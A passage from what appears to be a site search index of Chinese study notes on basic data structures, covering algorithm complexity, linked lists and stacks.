<p>\u6570\u636e\uff1a\u6240\u6709\u80fd\u88ab\u8f93\u5165\u5230\u8ba1\u7b97\u673a\u4e2d\uff0c\u4e14\u80fd\u88ab\u8ba1\u7b97\u673a\u5904\u7406\u7684\u7b26\u53f7\u7684\u96c6\u5408\u3002\u662f\u8ba1\u7b97\u673a\u64cd\u4f5c\u7684\u5bf9\u8c61\u7684\u603b\u79f0\u3002</p> <p>\u6570\u636e\u5143\u7d20\uff1a\u6570\u636e\uff08\u96c6\u5408\uff09\u4e2d\u7684\u4e00\u4e2a\u201c\u4e2a\u4f53\u201d\uff0c\u6570\u636e\u53ca\u7ed3\u6784\u4e2d\u8ba8\u8bba\u7684\u57fa\u672c\u5355\u4f4d</p> <p>\u6570\u636e\u9879\uff1a\u6570\u636e\u7684\u4e0d\u53ef\u5206\u5272\u7684\u6700\u5c0f\u5355\u4f4d\u3002\u4e00\u4e2a\u6570\u636e\u5143\u7d20\u53ef\u7531\u82e5\u5e72\u4e2a\u6570\u636e\u9879\u7ec4\u6210\u3002</p> <p>\u6570\u636e\u7c7b\u578b\uff1a\u5728\u4e00\u79cd\u7a0b\u5e8f\u8bbe\u8ba1\u8bed\u8a00\u4e2d\uff0c\u53d8\u91cf\u6240\u5177\u6709\u7684\u6570\u636e\u79cd\u7c7b\u3002\u6574\u578b\u3001\u6d6e\u70b9\u578b\u3001\u5b57\u7b26\u578b\u7b49\u7b49</p> <p>\u903b\u8f91\u7ed3\u6784\uff1a\u6570\u636e\u4e4b\u95f4\u7684\u76f8\u4e92\u5173\u7cfb\u3002</p> <p>\u96c6\u5408 \u7ed3\u6784\u4e2d\u7684\u6570\u636e\u5143\u7d20\u9664\u4e86\u540c\u5c5e\u4e8e\u4e00\u79cd\u7c7b\u578b\u5916\uff0c\u522b\u65e0\u5176\u5b83\u5173\u7cfb\u3002</p> <p>\u7ebf\u6027\u7ed3\u6784 \u6570\u636e\u5143\u7d20\u4e4b\u95f4\u4e00\u5bf9\u4e00\u7684\u5173\u7cfb</p> <p>\u6811\u5f62\u7ed3\u6784 \u6570\u636e\u5143\u7d20\u4e4b\u95f4\u4e00\u5bf9\u591a\u7684\u5173\u7cfb</p> <p>\u56fe\u72b6\u7ed3\u6784\u6216\u7f51\u72b6\u7ed3\u6784 \u7ed3\u6784\u4e2d\u7684\u6570\u636e\u5143\u7d20\u4e4b\u95f4\u5b58\u5728\u591a\u5bf9\u591a\u7684\u5173\u7cfb</p> <p>\u7269\u7406\u7ed3\u6784/\u5b58\u50a8\u7ed3\u6784\uff1a\u6570\u636e\u5728\u8ba1\u7b97\u673a\u4e2d\u7684\u8868\u793a\u3002\u7269\u7406\u7ed3\u6784\u662f\u63cf\u8ff0\u6570\u636e\u5177\u4f53\u5728\u5185\u5b58\u4e2d\u7684\u5b58\u50a8\uff08\u5982\uff1a\u987a\u5e8f\u7ed3\u6784\u3001\u94fe\u5f0f\u7ed3\u6784\u3001\u7d22\u5f15\u7ed3\u6784\u3001\u54c8\u5e0c\u7ed3\u6784\uff09\u7b49</p> <p>\u5728\u6570\u636e\u7ed3\u6784\u4e2d,\u4ece\u903b\u8f91\u4e0a\u53ef\u4ee5\u5c06\u5176\u5206\u4e3a\u7ebf\u6027\u7ed3\u6784\u548c\u975e\u7ebf\u6027\u7ed3\u6784</p> <p>\u6570\u636e\u7ed3\u6784\u7684\u57fa\u672c\u64cd\u4f5c\u7684\u8bbe\u7f6e\u7684\u6700\u91cd\u8981\u7684\u51c6\u5219\u662f,\u5b9e\u73b0\u5e94\u7528\u7a0b\u5e8f\u4e0e\u5b58\u50a8\u7ed3\u6784\u7684\u72ec\u7acb\u3002\u5b9e\u73b0\u5e94\u7528\u7a0b\u5e8f\u662f\u201c\u903b\u8f91\u7ed3\u6784\u201d\uff0c\u5b58\u50a8\u7684\u662f\u201c\u7269\u7406\u7ed3\u6784\u201d\u3002\u903b\u8f91\u7ed3\u6784\u4e3b\u8981\u662f\u5bf9\u8be5\u7ed3\u6784\u64cd\u4f5c\u7684\u8bbe\u5b9a\uff0c\u7269\u7406\u7ed3\u6784\u662f\u63cf\u8ff0\u6570\u636e\u5177\u4f53\u5728\u5185\u5b58\u4e2d\u7684\u5b58\u50a8\uff08\u5982\uff1a\u987a\u5e8f\u7ed3\u6784\u3001\u94fe\u5f0f\u7ed3\u6784\u3001\u7d22\u5f15\u7ed3\u6784\u3001hash\u7ed3\u6784\uff09\u7b49\u3002</p> <p>\u987a\u5e8f\u5b58\u50a8\u7ed3\u6784\u4e2d\uff0c\u7ebf\u6027\u8868\u7684\u903b\u8f91\u987a\u5e8f\u548c\u7269\u7406\u987a\u5e8f\u603b\u662f\u4e00\u81f4\u7684\u3002\u4f46\u5728\u94fe\u5f0f\u5b58\u50a8\u7ed3\u6784\u4e2d\uff0c\u7ebf\u6027\u8868\u7684\u903b\u8f91\u987a\u5e8f\u548c\u7269\u7406\u987a\u5e8f\u4e00\u822c\u662f\u4e0d\u540c\u7684\u3002</p> <p>\u7b97\u6cd5\u4e94\u4e2a\u7279\u6027\uff1a \u6709\u7a77\u6027\u3001\u786e\u5b9a\u6027\u3001\u53ef\u884c\u6027\u3001\u8f93\u5165\u3001\u8f93\u51fa</p> <p>\u7b97\u6cd5\u8bbe\u8ba1\u8981\u6c42\uff1a\u6b63\u786e\u6027\u3001\u53ef\u8bfb\u6027\u3001\u5065\u58ee\u6027\u3001\u9ad8\u6548\u7387\u4e0e\u4f4e\u5b58\u50a8\u91cf\u9700\u6c42\u3002(\u597d\u7684\u7b97\u6cd5)</p> <p>\u7b97\u6cd5\u7684\u63cf\u8ff0\u6709\u4f2a\u7a0b\u5e8f\u3001\u6d41\u7a0b\u56fe\u3001N-S\u7ed3\u6784\u56fe\u7b49\u3002E-R\u56fe\u662f\u5b9e\u4f53\u8054\u7cfb\u6a21\u578b\uff0c\u4e0d\u662f\u7a0b\u5e8f\u7684\u63cf\u8ff0\u65b9\u5f0f\u3002</p> <p>\u8bbe\u8ba1\u7b97\u6cd5\u5728\u6267\u884c\u65f6\u95f4\u65f6\u9700\u8981\u8003\u8651\uff1a\u7b97\u6cd5\u9009\u7528\u7684\u89c4\u6a21\u3001\u95ee\u9898\u7684\u89c4\u6a21</p> <p>\u65f6\u95f4\u590d\u6742\u5ea6\uff1a\u7b97\u6cd5\u7684\u6267\u884c\u65f6\u95f4\u4e0e\u539f\u64cd\u4f5c\u6267\u884c\u6b21\u6570\u4e4b\u548c\u6210\u6b63\u6bd4\u3002\u65f6\u95f4\u590d\u6742\u5ea6\u6709\u5c0f\u5230\u5927\uff1aO(1)\u3001O(logn)\u3001O(n)\u3001O(nlogn)\u3001O(n2)\u3001O(n3)\u3002\u5e42\u6b21\u65f6\u95f4\u590d\u6742\u5ea6\u6709\u5c0f\u5230\u5927O(2n)\u3001O(n!)\u3001O(nn)</p> <p>\u7a7a\u95f4\u590d\u6742\u5ea6\uff1a\u82e5\u8f93\u5165\u6570\u636e\u6240\u5360\u7a7a\u95f4\u53ea\u53d6\u51b3\u4e8e\u95ee\u9898\u672c\u8eab\uff0c\u548c\u7b97\u6cd5\u65e0\u5173\uff0c\u5219\u53ea\u9700\u8981\u5206\u6790\u9664\u8f93\u5165\u548c\u7a0b\u5e8f\u4e4b\u5916\u7684\u8f85\u52a9\u53d8\u91cf\u6240\u5360\u989d\u5916\u7a7a\u95f4\u3002</p>"},{"location":"other/data%20structure%20basic/#_2","title":"\u94fe\u8868","text":"<p>\u7ebf\u6027\u8868</p> <p>\u7ebf\u6027\u8868\u662f\u4e00\u79cd\u5178\u578b\u7684\u7ebf\u6027\u7ed3\u6784\u3002\u5934\u7ed3\u70b9\u65e0\u524d\u9a71\u6709\u4e00\u4e2a\u540e\u7ee7\uff0c\u5c3e\u8282\u70b9\u65e0\u540e\u7ee7\u6709\u4e00\u4e2a\u524d\u9a71\u3002\u94fe\u8868\u53ea\u80fd\u987a\u5e8f\u67e5\u627e\uff0c\u5b9a\u4f4d\u4e00\u4e2a\u5143\u7d20\u7684\u65f6\u95f4\u4e3aO(N)\uff0c\u5220\u9664\u4e00\u4e2a\u5143\u7d20\u7684\u65f6\u95f4\u4e3aO(1)</p> <p>\u7ebf\u6027\u8868\u7684\u987a\u5e8f\u5b58\u50a8\u7ed3\u6784\uff1a\u628a\u7ebf\u6027\u8868\u7684\u7ed3\u70b9\u6309\u903b\u8f91\u987a\u5e8f\u4f9d\u6b21\u5b58\u653e\u5728\u4e00\u7ec4\u5730\u5740\u8fde\u7eed\u7684\u5b58\u50a8\u5355\u5143\u91cc\u3002\u7528\u8fd9\u79cd\u65b9\u6cd5\u5b58\u50a8\u7684\u7ebf\u6027\u8868\u7b80\u79f0\u987a\u5e8f\u8868\u3002\u662f\u4e00\u79cd\u968f\u673a\u5b58\u53d6\u7684\u5b58\u50a8\u7ed3\u6784\u3002</p> <p>\u987a\u5e8f\u5b58\u50a8\u6307\u5185\u5b58\u5730\u5740\u662f\u4e00\u5757\u7684\uff0c\u968f\u673a\u5b58\u53d6\u6307\u8bbf\u95ee\u65f6\u53ef\u4ee5\u6309\u4e0b\u6807\u968f\u673a\u8bbf\u95ee\uff0c\u5b58\u50a8\u548c\u5b58\u53d6\u662f\u4e0d\u4e00\u6837\u7684\u3002</p> <p>\u5982\u679c\u662f\u5b58\u50a8\uff0c\u5219\u662f\u6307\u6309\u987a\u5e8f\u7684\uff0c\u5982\u679c\u662f\u5b58\u53d6\uff0c\u5219\u662f\u53ef\u4ee5\u968f\u673a\u7684\uff0c\u53ef\u4ee5\u5229\u7528\u5143\u7d20\u4e0b\u6807\u8fdb\u884c\u3002</p> <p>\u6570\u7ec4\u6bd4\u7ebf\u6027\u8868\u901f\u5ea6\u66f4\u5feb\u7684\u662f\uff1a\u539f\u5730\u9006\u5e8f\u3001\u8fd4\u56de\u4e2d\u95f4\u8282\u70b9\u3001\u9009\u62e9\u968f\u673a\u8282\u70b9\u3002 </p> <p>\u4fbf\u4e8e\u7ebf\u6027\u8868\u7684\u6784\u9020\u548c\u4efb\u610f\u5143\u7d20\u7684\u8bbf\u95ee</p> <p>\u63d2\u5165\uff1a\u63d2\u5165\u65b0\u7ed3\u70b9\uff0c\u4e4b\u540e\u7ed3\u70b9\u540e\u79fb\u3002\u5e73\u5747\u65f6\u95f4\u590d\u6742\u5ea6:O(n)</p> <p>\u5220\u9664\uff1a\u5220\u9664\u8282\u70b9\uff0c\u4e4b\u540e\u7ed3\u70b9\u524d\u79fb\u3002\u5e73\u5747\u65f6\u95f4\u590d\u6742\u5ea6:O(n)</p> <p>\u7ebf\u6027\u94fe\u8868\uff1a\u7528\u4e00\u7ec4\u4efb\u610f\u7684\u5b58\u50a8\u5355\u5143\u6765\u4f9d\u6b21\u5b58\u653e\u7ebf\u6027\u8868\u7684\u7ed3\u70b9\uff0c\u8fd9\u7ec4\u5b58\u50a8\u5355\u5143\u5373\u53ef\u4ee5\u662f\u8fde\u7eed\u7684\uff0c\u4e5f\u53ef\u4ee5\u662f\u4e0d\u8fde\u7eed\u7684\uff0c\u751a\u81f3\u662f\u96f6\u6563\u5206\u5e03\u5728\u5185\u5b58\u4e2d\u7684\u4efb\u610f\u4f4d\u7f6e\u4e0a\u7684\u3002\u56e0\u6b64\uff0c\u94fe\u8868\u4e2d\u7ed3\u70b9\u7684\u903b\u8f91\u6b21\u5e8f\u548c\u7269\u7406\u6b21\u5e8f\u4e0d\u4e00\u5b9a\u76f8\u540c\u3002PS\uff1a\u94fe\u8868\u7684\u524d\u4e00\u4e2a\u8282\u70b9\u7684\u6307\u9488\u6307\u5411\u540e\u4e00\u4e2a\u8282\u70b9\uff0c\u6240\u4ee5\u5728\u5185\u5b58\u4e2d\u53ef\u4ee5\u4e0d\u8fde\u7eed\u5b58\u50a8\uff0c\u6240\u4ee5\u903b\u8f91\u6b21\u5e8f\u548c\u7269\u7406\u6b21\u5e8f\u4e0d\u4e00\u5b9a\u76f8\u540c\u3002</p> <p>\u4e3a\u4e86\u80fd\u6b63\u786e\u8868\u793a\u7ed3\u70b9\u95f4\u7684\u903b\u8f91\u5173\u7cfb\uff0c\u5728\u5b58\u50a8\u6bcf\u4e2a\u7ed3\u70b9\u503c\u7684\u540c\u65f6\uff0c\u8fd8\u5fc5\u987b\u5b58\u50a8\u6307\u793a\u5176\u540e\u7ee7\u7ed3\u70b9\u7684\u5730\u5740\u3002data\u57df\u662f\u6570\u636e\u57df\uff0c\u7528\u6765\u5b58\u653e\u7ed3\u70b9\u7684\u503c\u3002next\u662f\u6307\u9488\u57df\uff08\u4ea6\u79f0\u94fe\u57df\uff09\uff0c\u7528\u6765\u5b58\u653e\u7ed3\u70b9\u7684\u76f4\u63a5\u540e\u7ee7\u7684\u5730\u5740\uff08\u6216\u4f4d\u7f6e\uff09\u3002\u4e0d\u9700\u8981\u4e8b\u5148\u4f30\u8ba1\u5b58\u50a8\u7a7a\u95f4\u5927\u5c0f\u3002 </p> <p>\u5355\u94fe\u8868\u4e2d\u6bcf\u4e2a\u7ed3\u70b9\u7684\u5b58\u50a8\u5730\u5740\u662f\u5b58\u653e\u5728\u5176\u524d\u8d8b\u7ed3\u70b9next\u57df\u4e2d\uff0c\u800c\u5f00\u59cb\u7ed3\u70b9\u65e0\u524d\u8d8b\uff0c\u6545\u5e94==\u8bbe\u5934\u6307\u9488head\u6307\u5411\u5f00\u59cb\u7ed3\u70b9\u3002\u540c\u65f6\uff0c\u7531\u4e8e\u6700\u540e\u4e00\u4e2a\u7ed3\u70b9\u65e0\u540e\u7ee7\uff0c\u6545\u7ed3\u70b9\u7684\u6307\u9488\u57df\u4e3a\u7a7a\uff0c\u5373NULL==\u3002\u5934\u63d2\u6cd5\u5efa\u8868(\u9006\u5e8f)\u3001\u5c3e\u63d2\u6cd5\u5efa\u8868(\u987a\u5e8f)\u3002\u589e\u52a0\u5934\u7ed3\u70b9\u7684\u76ee\u7684\u662f\u7b97\u6cd5\u5b9e\u73b0\u4e0a\u7684\u65b9\u4fbf\uff0c\u4f46\u589e\u5927\u4e86\u5185\u5b58\u5f00\u9500\u3002 </p> <p>\u67e5\u627e\uff1a\u53ea\u80fd\u4ece\u94fe\u8868\u7684\u5934\u6307\u9488\u51fa\u53d1\uff0c\u987a\u94fe\u57dfnext\u9010\u4e2a\u7ed3\u70b9\u5f80\u4e0b\u641c\u7d22\uff0c\u76f4\u5230\u641c\u7d22\u5230\u7b2ci\u4e2a\u7ed3\u70b9\u4e3a\u6b62\u3002\u56e0\u6b64\uff0c\u94fe\u8868\u4e0d\u662f\u968f\u673a\u5b58\u53d6\u7ed3\u6784\u3002</p> <p>\u63d2\u5165\uff1a\u5148\u627e\u5230\u8868\u7684\u7b2ci-1\u7684\u5b58\u50a8\u4f4d\u7f6e\uff0c\u7136\u540e\u63d2\u5165\u3002\u65b0\u7ed3\u70b9\u5148\u8fde\u540e\u7ee7\uff0c\u518d\u8fde\u524d\u9a71\u3002</p> <p>\u5220\u9664\uff1a\u9996\u5148\u627e\u5230ai-1\u7684\u5b58\u50a8\u4f4d\u7f6ep\u3002\u7136\u540e\u4ee4p\u2013&gt;next\u6307\u5411ai\u7684\u76f4\u63a5\u540e\u7ee7\u7ed3\u70b9\uff0c\u5373\u628aai\u4ece\u94fe\u4e0a\u6458\u4e0b\u3002\u6700\u540e\u91ca\u653e\u7ed3\u70b9ai\u7684\u7a7a\u95f4.r=p-&gt;next;p-&gt;next=r-&gt;next;delete r\u3002</p> <p>\u5224\u65ad\u4e00\u4e2a\u5355\u5411\u94fe\u8868\u4e2d\u662f\u5426\u5b58\u5728\u73af\u7684\u6700\u4f73\u65b9\u6cd5\u662f\u5feb\u6162\u6307\u9488\u3002</p> <p>\u9759\u6001\u94fe\u8868\uff1a\u7528\u4e00\u7ef4\u6570\u7ec4\u6765\u5b9e\u73b0\u7ebf\u6027\u94fe\u8868\uff0c\u8fd9\u79cd\u7528\u4e00\u7ef4\u6570\u7ec4\u8868\u793a\u7684\u7ebf\u6027\u94fe\u8868\uff0c\u79f0\u4e3a\u9759\u6001\u94fe\u8868\u3002\u9759\u6001\uff1a\u4f53\u73b0\u5728\u8868\u7684\u5bb9\u91cf\u662f\u4e00\u5b9a\u7684\u3002\uff08\u6570\u7ec4\u7684\u5927\u5c0f\uff09\uff1b\u94fe\u8868\uff1a\u63d2\u5165\u4e0e\u5220\u9664\u540c\u524d\u9762\u6240\u8ff0\u7684\u52a8\u6001\u94fe\u8868\u65b9\u6cd5\u76f8\u540c\u3002\u9759\u6001\u94fe\u8868\u4e2d\u6307\u9488\u8868\u793a\u7684\u662f\u4e0b\u4e00\u5143\u7d20\u5728\u6570\u7ec4\u4e2d\u7684\u4f4d\u7f6e\u3002\u9759\u6001\u94fe\u8868\u662f\u7528\u6570\u7ec4\u5b9e\u73b0\u7684\uff0c\u662f\u987a\u5e8f\u7684\u5b58\u50a8\u7ed3\u6784\uff0c\u5728\u7269\u7406\u5730\u5740\u4e0a\u662f\u8fde\u7eed\u7684\uff0c\u800c\u4e14\u9700\u8981\u9884\u5148\u5206\u914d\u5927\u5c0f\u3002</p> <p>\u52a8\u6001\u94fe\u8868\u662f\u7528\u7533\u8bf7\u5185\u5b58\u51fd\u6570\uff08C\u662fmalloc,C++\u662fnew\uff09\u52a8\u6001\u7533\u8bf7\u5185\u5b58\u7684\uff0c\u6240\u4ee5\u5728\u94fe\u8868\u7684\u957f\u5ea6\u4e0a\u6ca1\u6709\u9650\u5236\u3002\u52a8\u6001\u94fe\u8868\u56e0\u4e3a\u662f\u52a8\u6001\u7533\u8bf7\u5185\u5b58\u7684\uff0c\u6240\u4ee5\u6bcf\u4e2a\u8282\u70b9\u7684\u7269\u7406\u5730\u5740\u4e0d\u8fde\u7eed\uff0c\u8981\u901a\u8fc7\u6307\u9488\u6765\u987a\u5e8f\u8bbf\u95ee\u3002\u9759\u6001\u94fe\u8868\u5728\u63d2\u5165\u3001\u5220\u9664\u65f6\u4e5f\u662f\u901a\u8fc7\u4fee\u6539\u6307\u9488\u57df\u6765\u5b9e\u73b0\u7684\uff0c\u4e0e\u52a8\u6001\u94fe\u8868\u6ca1\u6709\u4ec0\u4e48\u5206\u522b</p> <p>\u5faa\u73af\u94fe\u8868\uff1a\u662f\u4e00\u79cd\u5934\u5c3e\u76f8\u63a5\u7684\u94fe\u8868\u3002\u5176\u7279\u70b9\u662f\u65e0\u987b\u589e\u52a0\u5b58\u50a8\u91cf\uff0c\u4ec5\u5bf9\u8868\u7684\u94fe\u63a5\u65b9\u5f0f\u7a0d\u4f5c\u6539\u53d8\uff0c\u5373\u53ef\u4f7f\u5f97\u8868\u5904\u7406\u66f4\u52a0\u65b9\u4fbf\u7075\u6d3b\u3002 </p> <p>\u5728\u5355\u94fe\u8868\u4e2d\uff0c\u5c06\u7ec8\u7aef\u7ed3\u70b9\u7684\u6307\u9488\u57dfNULL\u6539\u4e3a\u6307\u5411\u8868\u5934\u7ed3\u70b9\u7684\u6216\u5f00\u59cb\u7ed3\u70b9\uff0c\u5c31\u5f97\u5230\u4e86\u5355\u94fe\u5f62\u5f0f\u7684\u5faa\u73af\u94fe\u8868\uff0c\u5e76\u7b80\u5355\u79f0\u4e3a\u5355\u5faa\u73af\u94fe\u8868\u3002\u7531\u4e8e\u5faa\u73af\u94fe\u8868\u4e2d\u6ca1\u6709NULL\u6307\u9488\uff0c\u6545\u6d89\u53ca\u904d\u5386\u64cd\u4f5c\u65f6\uff0c\u5176\u7ec8\u6b62\u6761\u4ef6\u5c31\u4e0d\u518d\u50cf\u975e\u5faa\u73af\u94fe\u8868\u90a3\u6837\u5224\u65adp\u6216p\u2014&gt;next\u662f\u5426\u4e3a\u7a7a\uff0c\u800c\u662f\u5224\u65ad\u5b83\u4eec\u662f\u5426\u7b49\u4e8e\u67d0\u4e00\u6307\u5b9a\u6307\u9488\uff0c\u5982\u5934\u6307\u9488\u6216\u5c3e\u6307\u9488\u7b49\u3002</p> <p>\u53cc\u5411\u94fe\u8868: \u5728\u5355\u94fe\u8868\u7684\u6bcf\u4e2a\u7ed3\u70b9\u91cc\u518d\u589e\u52a0\u4e00\u4e2a\u6307\u5411\u5176\u76f4\u63a5\u524d\u8d8b\u7684\u6307\u9488\u57dfprior\u3002\u8fd9\u6837\u5c31\u5f62\u6210\u7684\u94fe\u8868\u4e2d\u6709\u4e24\u4e2a\u65b9\u5411\u4e0d\u540c\u7684\u94fe\u3002\u53cc\u94fe\u8868\u4e00\u822c\u7531\u5934\u6307\u9488\u552f\u4e00\u786e\u5b9a\u7684\uff0c\u5c06\u5934\u7ed3\u70b9\u548c\u5c3e\u7ed3\u70b9\u94fe\u63a5\u8d77\u6765\u6784\u6210\u5faa\u73af\u94fe\u8868\uff0c\u5e76\u79f0\u4e4b\u4e3a\u53cc\u5411\u94fe\u8868\u3002\u8bbe\u6307\u9488p\u6307\u5411\u67d0\u4e00\u7ed3\u70b9\uff0c\u5219\u53cc\u5411\u94fe\u8868\u7ed3\u6784\u7684\u5bf9\u79f0\u6027\u53ef\u7528\u4e0b\u5f0f\u63cf\u8ff0\uff1ap\u2014&gt;prior\u2014&gt;next=p=p\u2014&gt;next\u2014&gt;prior\u3002\u4ece\u4e24\u4e2a\u65b9\u5411\u641c\u7d22\u53cc\u94fe\u8868\uff0c\u6bd4\u4ece\u4e00\u4e2a\u65b9\u5411\u641c\u7d22\u53cc\u94fe\u8868\u7684\u65b9\u5dee\u8981\u5c0f\u3002 </p> <p>\u63d2\u5165\uff1a\u5148\u641e\u5b9a\u63d2\u5165\u8282\u70b9\u7684\u524d\u9a71\u548c\u540e\u7ee7\uff0c\u518d\u641e\u5b9a\u540e\u7ed3\u70b9\u7684\u524d\u9a71\uff0c\u6700\u540e\u641e\u5b9a\u524d\u7ed3\u70b9\u7684\u540e\u7ee7\u3002</p> <p>\u5728\u6709\u5e8f\u53cc\u5411\u94fe\u8868\u4e2d\u5b9a\u4f4d\u5220\u9664\u4e00\u4e2a\u5143\u7d20\u7684\u5e73\u5747\u65f6\u95f4\u590d\u6742\u5ea6\u4e3aO(n)</p> <p>\u53ef\u4ee5\u76f4\u63a5\u5220\u9664\u5f53\u524d\u6307\u9488\u6240\u6307\u5411\u7684\u8282\u70b9\u3002\u800c\u4e0d\u9700\u8981\u50cf\u5355\u5411\u94fe\u8868\u4e2d\uff0c\u5220\u9664\u4e00\u4e2a\u5143\u7d20\u5fc5\u987b\u627e\u5230\u5176\u524d\u9a71\u3002\u56e0\u6b64\u5728\u63d2\u5165\u6570\u636e\u65f6\uff0c\u5355\u5411\u94fe\u8868\u548c\u53cc\u5411\u94fe\u8868\u64cd\u4f5c\u590d\u6742\u5ea6\u76f8\u540c\uff0c\u800c\u5220\u9664\u6570\u636e\u65f6\uff0c\u53cc\u5411\u94fe\u8868\u7684\u6027\u80fd\u4f18\u4e8e\u5355\u5411\u94fe\u8868</p> <p> \u7591\u95ee\uff1a\u53cc\u5411\u94fe\u8868\u5220\u9664\u6570\u636e\u540e\uff0c\u8fd9\u4e2a\u8282\u70b9\u7684\u524d\u540e\u8282\u70b9\u7684\u6307\u9488\u9700\u8981\u6539\u53d8</p>"},{"location":"other/data%20structure%20basic/#_3","title":"\u6808\u548c\u961f\u5217","text":"<p>\u6808</p> <p>\u6808(Stack)\u662f\u9650\u5236\u5728\u8868\u7684\u4e00\u7aef\u8fdb\u884c\u63d2\u5165\u548c\u5220\u9664\u8fd0\u7b97\u7684\u7ebf\u6027\u8868\uff0c\u901a\u5e38\u79f0\u63d2\u5165\u3001\u5220\u9664\u7684\u8fd9\u4e00\u7aef\u4e3a\u6808\u9876(Top)\uff0c\u53e6\u4e00\u7aef\u4e3a\u6808\u5e95(Bottom)\u3002\u5148\u8fdb\u540e\u51fa\u3002top= -1\u65f6\u4e3a\u7a7a\u6808\uff0ctop=0\u53ea\u80fd\u8bf4\u660e\u6808\u4e2d\u53ea\u6709\u4e00\u4e2a\u5143\u7d20\uff0c\u5e76\u4e14\u5143\u7d20\u8fdb\u6808\u65f6top\u5e94\u8be5\u81ea\u589e</p> <p>\u987a\u5e8f\u5b58\u50a8\u6808\uff1a\u987a\u5e8f\u5b58\u50a8\u7ed3\u6784</p> <p>\u94fe\u6808\uff1a\u94fe\u5f0f\u5b58\u50a8\u7ed3\u6784\u3002\u63d2\u5165\u548c\u5220\u9664\u64cd\u4f5c\u4ec5\u9650\u5236\u5728\u94fe\u5934\u4f4d\u7f6e\u4e0a\u8fdb\u884c\u3002\u6808\u9876\u6307\u9488\u5c31\u662f\u94fe\u8868\u7684\u5934\u6307\u9488\u3002\u901a\u5e38\u4e0d\u4f1a\u51fa\u73b0\u6808\u6ee1\u7684\u60c5\u51b5\u3002 \u4e0d\u9700\u8981\u5224\u65ad\u6808\u6ee1\u4f46\u9700\u8981\u5224\u65ad\u6808\u7a7a\u3002</p> <p>\u4e24\u4e2a\u6808\u5171\u7528\u9759\u6001\u5b58\u50a8\u7a7a\u95f4,\u5bf9\u5934\u4f7f\u7528\u4e5f\u5b58\u5728\u7a7a\u95f4\u6ea2\u51fa\u95ee\u9898\u3002\u68081\u7684\u5e95\u5728v[1]\uff0c\u68082\u7684\u5e95\u5728V[m]\uff0c\u5219\u6808\u6ee1\u7684\u6761\u4ef6\u662ftop[1]+1=top[2]\u3002</p> <p>\u57fa\u672c\u64cd\u4f5c\uff1a\u5220\u9664\u6808\u9876\u5143\u7d20\u3001\u5224\u65ad\u6808\u662f\u5426\u4e3a\u7a7a\u4ee5\u53ca\u5c06\u6808\u7f6e\u4e3a\u7a7a\u6808\u7b49</p> <p>\u5bf9\u4e8en\u5404\u5143\u7d20\u7684\u5165\u6808\u95ee\u9898\uff0c\u53ef\u80fd\u7684\u51fa\u6808\u987a\u5e8f\u6709C(2n,n)/(n+1)\u4e2a\u3002</p> <p>\u5806\u6808\u6ea2\u51fa\u4e00\u822c\u662f\u5faa\u73af\u7684\u9012\u5f52\u8c03\u7528\u3001\u5927\u6570\u636e\u7ed3\u6784\u7684\u5c40\u90e8\u53d8\u91cf\u5bfc\u81f4\u7684</p> <p>\u5e94\u7528\uff0c\u4ee3\u7801\uff1a</p> <p>\u8fdb\u5236\u8f6c\u6362</p> <p>\u62ec\u53f7\u5339\u914d\u7684\u68c0\u9a8c</p> <p>\u884c\u7f16\u8f91\u7a0b\u5e8f</p> <p>\u8ff7\u5bab\u6c42\u89e3\uff1a\u82e5\u5f53\u524d\u4f4d\u7f6e\u201c\u53ef\u901a\u201d\uff0c\u5219\u7eb3\u5165\u8def\u5f84\uff0c\u7ee7\u7eed\u524d\u8fdb;\u82e5\u5f53\u524d\u4f4d\u7f6e\u201c\u4e0d\u53ef\u901a\u201d\uff0c\u5219\u540e\u9000\uff0c\u6362\u65b9\u5411\u7ee7\u7eed\u63a2\u7d22;\u82e5\u56db\u5468\u201c\u5747\u65e0\u901a\u8def\u201d\uff0c\u5219\u5c06\u5f53\u524d\u4f4d\u7f6e\u4ece\u8def\u5f84\u4e2d\u5220\u9664\u51fa\u53bb\u3002</p> <p>\u8868\u8fbe\u5f0f\u6c42\u89e3\uff1a\u524d\u7f00\u3001\u4e2d\u7f00\u3001\u540e\u7f00\u3002 </p> <p>\u64cd\u4f5c\u6570\u4e4b\u95f4\u7684\u76f8\u5bf9\u6b21\u5e8f\u4e0d\u53d8;</p> <p>\u8fd0\u7b97\u7b26\u7684\u76f8\u5bf9\u6b21\u5e8f\u4e0d\u540c;</p> <p>\u4e2d\u7f00\u5f0f\u4e22\u5931\u4e86\u62ec\u5f27\u4fe1\u606f\uff0c\u81f4\u4f7f\u8fd0\u7b97\u7684\u6b21\u5e8f\u4e0d\u786e\u5b9a</p> <p>\u524d\u7f00\u5f0f\u7684\u8fd0\u7b97\u89c4\u5219\u4e3a:\u8fde\u7eed\u51fa\u73b0\u7684\u4e24\u4e2a\u64cd\u4f5c\u6570\u548c\u5728\u5b83\u4eec\u4e4b\u524d\u4e14\u7d27\u9760\u5b83\u4eec\u7684\u8fd0\u7b97\u7b26\u6784\u6210\u4e00\u4e2a\u6700\u5c0f\u8868\u8fbe\u5f0f</p> <p>\u540e\u7f00\u5f0f\u7684\u8fd0\u7b97\u89c4\u5219\u4e3a:\u8fd0\u7b97\u7b26\u5728\u5f0f\u4e2d\u51fa\u73b0\u7684\u987a\u5e8f\u6070\u4e3a\u8868\u8fbe\u5f0f\u7684\u8fd0\u7b97\u987a\u5e8f;\u6bcf\u4e2a\u8fd0\u7b97\u7b26\u548c\u5728\u5b83\u4e4b\u524d\u51fa\u73b0\u4e14\u7d27\u9760\u5b83\u7684\u4e24\u4e2a\u64cd\u4f5c\u6570\u6784\u6210\u4e00\u4e2a\u6700\u5c0f\u8868\u8fbe\u5f0f\u3002</p> <p>\u5b9e\u73b0\u9012\u5f52\uff1a\u591a\u4e2a\u51fd\u6570\u5d4c\u5957\u8c03\u7528\u7684\u89c4\u5219\u662f\uff1a\u540e\u8c03\u7528\u5148\u8fd4\u56de\u3002</p> 